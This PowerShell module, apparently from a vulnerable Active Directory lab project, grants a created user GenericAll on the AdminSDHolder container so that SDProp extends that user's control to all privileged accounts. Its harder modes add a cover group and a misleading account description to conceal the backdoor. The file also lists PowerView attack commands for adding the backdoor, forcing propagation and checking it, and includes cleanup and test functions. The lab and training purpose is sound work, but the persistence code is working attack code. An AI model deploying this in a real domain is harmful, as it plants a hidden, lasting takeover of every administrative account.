#Requires -Modules ActiveDirectory

<#
.SYNOPSIS
    Deploys AdminSDHolder persistence scenarios in Active Directory.

.DESCRIPTION
    Creates a user and grants them GenericAll permissions on the AdminSDHolder container.
    The Security Descriptor Propagator (SDProp) process runs every 60 minutes and copies
    the AdminSDHolder ACL to all protected objects (Domain Admins, Enterprise Admins,
    Schema Admins, etc.). This grants the attacker persistent control over all privileged
    accounts and groups in the domain.

    WARNING: This is a powerful persistence mechanism. The ACL changes propagated by SDProp
    survive password resets, group membership changes, and most standard remediation steps.

    MITRE ATT&CK: T1098 - Account Manipulation

.PARAMETER Difficulty
    Scenario difficulty level. Affects password complexity and detection evasion.
    Valid values: Easy, Medium, Hard.

.PARAMETER DomainDN
    The distinguished name of the domain (e.g., DC=contoso,DC=com).

.PARAMETER Domain
    The NetBIOS or FQDN of the domain (e.g., contoso.com).

.EXAMPLE
    Deploy-AdminSDHolder -Difficulty Medium -DomainDN 'DC=contoso,DC=com' -Domain 'contoso.com'

.EXAMPLE
    Remove-AdminSDHolder -DomainDN 'DC=contoso,DC=com'

.EXAMPLE
    Test-AdminSDHolder -DomainDN 'DC=contoso,DC=com'

.NOTES
    Module: VulnAD - AdminSDHolder Persistence
    Author: VulnAD Project
    Requires: ActiveDirectory module, VulnAD-Core.ps1 helpers
    WARNING: This deploys a real persistence mechanism. Use only in isolated lab environments.
#>

function Deploy-AdminSDHolder {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [ValidateSet('Easy', 'Medium', 'Hard')]
        [string]$Difficulty,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$DomainDN,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$Domain
    )

    begin {
        Write-VulnStatus -Message "Deploying AdminSDHolder Persistence scenario [$Difficulty]" -Type 'Info'
        Write-VulnStatus -Message "[!] WARNING: AdminSDHolder abuse is a powerful persistence mechanism." -Type 'Warning'
        Write-VulnStatus -Message "[!] SDProp will propagate ACL changes to ALL protected objects within 60 minutes." -Type 'Warning'

        $usersOU   = "OU=Users,OU=ADMonolith,$DomainDN"
        $createdObjects = [System.Collections.Generic.List[string]]::new()

        $adminSDHolderDN = "CN=AdminSDHolder,CN=System,$DomainDN"
    }

    process {
        try {
            # ---------------------------------------------------------------
            # Step 1: Create user f.garcia
            # ---------------------------------------------------------------
            Write-VulnStatus -Message "Creating user f.garcia (IT Security Analyst)" -Type 'Info'

            $pwGarcia = Get-VulnPassword -Difficulty $Difficulty -Index 4

            $userGarcia = New-VulnUser `
                -SamAccountName 'f.garcia' `
                -Name 'Felipe Garcia' `
                -Password $pwGarcia `
                -DomainDN $DomainDN `
                -Description 'IT Security Analyst - SOC Team'

            if ($userGarcia) {
                $createdObjects.Add("CN=Felipe Garcia,$usersOU")
                Write-VulnResult -Name 'f.garcia' -Detail "User created in VulnAD Users OU" -Success $true
            }
            else {
                Write-VulnResult -Name 'f.garcia' -Detail "Failed to create user" -Success $false
                Write-VulnStatus -Message "Cannot proceed without user f.garcia" -Type 'Error'
                return
            }

            # ---------------------------------------------------------------
            # Step 2: Grant GenericAll on AdminSDHolder container
            # ---------------------------------------------------------------
            Write-VulnStatus -Message "Granting f.garcia GenericAll on AdminSDHolder ($adminSDHolderDN)" -Type 'Info'

            try {
                # Retrieve the user SID
                $userSID = (Get-ADUser -Identity 'f.garcia' -ErrorAction Stop).SID

                # Connect to AdminSDHolder via ADSI
                $adminSDHolder = [ADSI]"LDAP://$adminSDHolderDN"

                if (-not $adminSDHolder.Path) {
                    throw "Failed to bind to AdminSDHolder container at $adminSDHolderDN"
                }

                # Create an ACE granting GenericAll
                $identityRef  = New-Object System.Security.Principal.SecurityIdentifier($userSID)
                $adRights     = [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
                $accessType   = [System.Security.AccessControl.AccessControlType]::Allow
                $inheritance  = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All

                $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                    $identityRef,
                    $adRights,
                    $accessType,
                    $inheritance
                )

                # Apply the ACE to the AdminSDHolder security descriptor
                $adminSDHolder.ObjectSecurity.AddAccessRule($ace)
                $adminSDHolder.CommitChanges()

                $createdObjects.Add("ACE on $adminSDHolderDN for f.garcia")
                Write-VulnResult -Name 'AdminSDHolder ACL' -Detail "GenericAll granted to f.garcia on AdminSDHolder" -Success $true

                Write-VulnStatus -Message "[!] SDProp will propagate this ACL within 60 minutes" -Type 'Warning'
                Write-VulnStatus -Message "[!] After propagation, f.garcia will have GenericAll on all protected objects" -Type 'Warning'
            }
            catch {
                Write-VulnResult -Name 'AdminSDHolder ACL' -Detail "Failed to modify AdminSDHolder ACL: $_" -Success $false
                Write-VulnStatus -Message "AdminSDHolder ACL modification failed. Manual steps may be required." -Type 'Error'
            }

            # ---------------------------------------------------------------
            # Step 3: Difficulty-specific enhancements
            # ---------------------------------------------------------------
            switch ($Difficulty) {
                'Easy' {
                    Write-VulnResult -Name 'Difficulty' -Detail "Easy: ACL is straightforward GenericAll, easily visible in ACL audits" -Success $true -IsLast
                }
                'Medium' {
                    # Add user to a benign-looking group to add some cover
                    try {
                        $coverGroup = New-VulnGroup `
                            -Name 'Security-Audit-Review' `
                            -DomainDN $DomainDN `
                            -Description 'Security audit and compliance review team'

                        if ($coverGroup) {
                            $createdObjects.Add("CN=Security-Audit-Review,OU=Groups,OU=ADMonolith,$DomainDN")
                            Add-ADGroupMember -Identity 'Security-Audit-Review' -Members 'f.garcia' -ErrorAction Stop
                            Write-VulnResult -Name 'Security-Audit-Review' -Detail "Cover group created; f.garcia added to obscure intent" -Success $true -IsLast
                        }
                    }
                    catch {
                        Write-VulnResult -Name 'Security-Audit-Review' -Detail "Cover group setup failed: $_" -Success $false -IsLast
                    }
                }
                'Hard' {
                    # Add cover group and set a misleading description on the user
                    try {
                        $coverGroup = New-VulnGroup `
                            -Name 'Security-Audit-Review' `
                            -DomainDN $DomainDN `
                            -Description 'Security audit and compliance review team'

                        if ($coverGroup) {
                            $createdObjects.Add("CN=Security-Audit-Review,OU=Groups,OU=ADMonolith,$DomainDN")
                            Add-ADGroupMember -Identity 'Security-Audit-Review' -Members 'f.garcia' -ErrorAction Stop
                        }

                        # Update description to look like a legitimate audit account
                        Set-ADUser -Identity 'f.garcia' -Description 'Security Compliance Auditor - Read-Only Audit Access' -ErrorAction Stop
                        Write-VulnResult -Name 'Hard obfuscation' -Detail "Cover group and misleading description applied" -Success $true -IsLast
                    }
                    catch {
                        Write-VulnResult -Name 'Hard obfuscation' -Detail "Obfuscation setup failed: $_" -Success $false -IsLast
                    }
                }
            }
        }
        catch {
            Write-VulnStatus -Message "Critical error during AdminSDHolder deployment: $_" -Type 'Error'
            throw
        }
    }

    end {
        $result = @{
            Scenario       = 'AdminSDHolder Persistence'
            Description    = @(
                'WARNING: This is a powerful persistence mechanism!',
                '',
                'f.garcia has been granted GenericAll on the AdminSDHolder container.',
                'The Security Descriptor Propagator (SDProp) runs every 60 minutes and',
                'copies the AdminSDHolder ACL to all protected objects including:',
                '  - Domain Admins, Enterprise Admins, Schema Admins',
                '  - Account Operators, Server Operators, Backup Operators',
                '  - Administrator, krbtgt',
                '',
                'After SDProp runs, f.garcia will effectively control all privileged accounts.',
                'This persists across password resets and standard group membership changes.'
            ) -join "`n"
            CreatedObjects = $createdObjects.ToArray()
            AttackCommands = @(
                '# --- PowerView: Enumerate AdminSDHolder ACL ---',
                "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,$DomainDN' -ResolveGUIDs | Where-Object { `$_.SecurityIdentifier -match 'f.garcia' }",
                '',
                '# --- Manually trigger SDProp (requires DA) ---',
                '# Option 1: PowerView',
                'Invoke-SDPropagator -ShowProgress',
                '',
                '# Option 2: LDAP modification (set RunProtectAdminGroupsTask)',
                '$rootDSE = [ADSI]"LDAP://RootDSE"',
                '$rootDSE.Put("RunProtectAdminGroupsTask", 1)',
                '$rootDSE.SetInfo()',
                '',
                '# --- PowerView: Add backdoor via AdminSDHolder ---',
                "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,$DomainDN' -PrincipalIdentity f.garcia -Rights All",
                '',
                '# --- Verify propagation: Check ACL on Domain Admins ---',
                "Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | Where-Object { `$_.IdentityReference -match 'f.garcia' }",
                '',
                '# --- AD Module: Check AdminSDHolder ACL ---',
                "(Get-Acl 'AD:CN=AdminSDHolder,CN=System,$DomainDN').Access | Where-Object { `$_.IdentityReference -match 'f.garcia' }"
            )
            AttackPath     = @(
                'f.garcia (IT Security Analyst)',
                '  |',
                '  |-- GenericAll on AdminSDHolder container',
                '  |',
                '  |-- [SDProp runs every 60 minutes]',
                '  |',
                '  |-- ACL propagated to all protected objects:',
                '  |     |-- Domain Admins',
                '  |     |-- Enterprise Admins',
                '  |     |-- Schema Admins',
                '  |     |-- Administrator / krbtgt',
                '  |',
                '  |-- Full control over all privileged domain objects',
                '  |-- Persistent even after password resets'
            ) -join "`n"
            MitreID        = 'T1098'
            Difficulty     = $Difficulty
        }

        Write-VulnStatus -Message "AdminSDHolder Persistence scenario deployed successfully" -Type 'Success'
        return $result
    }
}

function Remove-AdminSDHolder {
    <#
    .SYNOPSIS
        Removes all objects and ACLs created by the AdminSDHolder scenario.

    .PARAMETER DomainDN
        The distinguished name of the domain.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$DomainDN
    )

    begin {
        Write-VulnStatus -Message "Removing AdminSDHolder Persistence scenario objects" -Type 'Info'
        $adminSDHolderDN = "CN=AdminSDHolder,CN=System,$DomainDN"
    }

    process {
        # --- Remove ACE from AdminSDHolder ---
        try {
            $userObj = Get-ADUser -Identity 'f.garcia' -ErrorAction Stop
            $userSID = $userObj.SID

            $adminSDHolder = [ADSI]"LDAP://$adminSDHolderDN"
            $sdHolder = $adminSDHolder.ObjectSecurity

            # Find and remove ACEs belonging to f.garcia
            $acesToRemove = $sdHolder.GetAccessRules($true, $false, [System.Security.Principal.SecurityIdentifier]) |
                Where-Object { $_.IdentityReference.Value -eq $userSID.Value }

            foreach ($aceEntry in $acesToRemove) {
                $sdHolder.RemoveAccessRule($aceEntry) | Out-Null
            }

            $adminSDHolder.CommitChanges()
            Write-VulnResult -Name 'AdminSDHolder ACL' -Detail "Removed f.garcia ACE from AdminSDHolder" -Success $true
        }
        catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
            Write-VulnResult -Name 'AdminSDHolder ACL' -Detail "User f.garcia not found; ACL may already be clean" -Success $true
        }
        catch {
            Write-VulnResult -Name 'AdminSDHolder ACL' -Detail "Failed to clean AdminSDHolder ACL: $_" -Success $false
        }

        # --- Remove cover group if it exists ---
        try {
            Remove-ADGroup -Identity 'Security-Audit-Review' -Confirm:$false -ErrorAction Stop
            Write-VulnResult -Name 'Security-Audit-Review' -Detail "Cover group removed" -Success $true
        }
        catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
            Write-VulnResult -Name 'Security-Audit-Review' -Detail "Cover group not found (not created or already removed)" -Success $true
        }
        catch {
            Write-VulnResult -Name 'Security-Audit-Review' -Detail "Failed to remove cover group: $_" -Success $false
        }

        # --- Remove user ---
        try {
            Remove-ADUser -Identity 'f.garcia' -Confirm:$false -ErrorAction Stop
            Write-VulnResult -Name 'f.garcia' -Detail "User removed successfully" -Success $true -IsLast
        }
        catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
            Write-VulnResult -Name 'f.garcia' -Detail "User not found (already removed)" -Success $true -IsLast
        }
        catch {
            Write-VulnResult -Name 'f.garcia' -Detail "Failed to remove user: $_" -Success $false -IsLast
        }
    }

    end {
        Write-VulnStatus -Message "AdminSDHolder cleanup complete" -Type 'Success'
        Write-VulnStatus -Message "[!] Note: SDProp-propagated ACLs on protected objects may persist until next SDProp cycle cleans them" -Type 'Warning'
    }
}

function Test-AdminSDHolder {
    <#
    .SYNOPSIS
        Validates that AdminSDHolder scenario objects exist and ACL is configured.

    .PARAMETER DomainDN
        The distinguished name of the domain.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$DomainDN
    )

    begin {
        Write-VulnStatus -Message "Testing AdminSDHolder Persistence scenario" -Type 'Info'
        $allPassed = $true
        $adminSDHolderDN = "CN=AdminSDHolder,CN=System,$DomainDN"
    }

    process {
        # --- Test user exists ---
        try {
            $user = Get-ADUser -Identity 'f.garcia' -ErrorAction Stop
            Write-VulnResult -Name 'f.garcia' -Detail "User exists" -Success $true
        }
        catch {
            Write-VulnResult -Name 'f.garcia' -Detail "User not found: $_" -Success $false
            $allPassed = $false
        }

        # --- Test AdminSDHolder ACL ---
        try {
            $userSID = (Get-ADUser -Identity 'f.garcia' -ErrorAction Stop).SID
            $adminSDHolder = [ADSI]"LDAP://$adminSDHolderDN"
            $aces = $adminSDHolder.ObjectSecurity.GetAccessRules($true, $false, [System.Security.Principal.SecurityIdentifier])

            $matchingAce = $aces | Where-Object {
                $_.IdentityReference.Value -eq $userSID.Value -and
                $_.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
            }

            if ($matchingAce) {
                Write-VulnResult -Name 'AdminSDHolder ACL' -Detail "f.garcia has GenericAll on AdminSDHolder" -Success $true -IsLast
            }
            else {
                Write-VulnResult -Name 'AdminSDHolder ACL' -Detail "f.garcia does NOT have GenericAll on AdminSDHolder" -Success $false -IsLast
                $allPassed = $false
            }
        }
        catch {
            Write-VulnResult -Name 'AdminSDHolder ACL' -Detail "Failed to check AdminSDHolder ACL: $_" -Success $false -IsLast
            $allPassed = $false
        }
    }

    end {
        if ($allPassed) {
            Write-VulnStatus -Message "All AdminSDHolder tests passed" -Type 'Success'
        }
        else {
            Write-VulnStatus -Message "Some AdminSDHolder tests failed" -Type 'Warning'
        }
        return $allPassed
    }
}

